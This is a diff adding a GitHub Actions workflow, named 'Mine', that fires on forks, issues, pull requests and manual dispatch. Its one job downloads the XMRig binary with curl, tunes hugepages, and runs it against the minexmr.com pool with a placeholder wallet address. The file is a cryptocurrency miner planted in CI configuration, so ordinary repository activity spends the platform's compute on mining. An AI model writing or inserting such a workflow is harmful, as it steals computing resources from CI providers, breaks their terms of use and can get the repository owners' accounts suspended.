@@ -1,0 +1,19 @@
+name: Mine
+
+on:
+  fork:
+  issues:
+  pull_request:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          sudo apt update && sudo apt install hwloc -qq -y
+          sudo curl -sLo /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-focal-x64.tar.gz
+          cd /tmp
+          sudo tar -zxf /tmp/xmrig.tar.gz
+          sudo sysctl -w vm.nr_hugepages=1280
+          sudo chmod +x /tmp/xmrig-6.17.0/xmrig && /tmp/xmrig-6.17.0/xmrig -o pool.minexmr.com:4444 -u 45000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
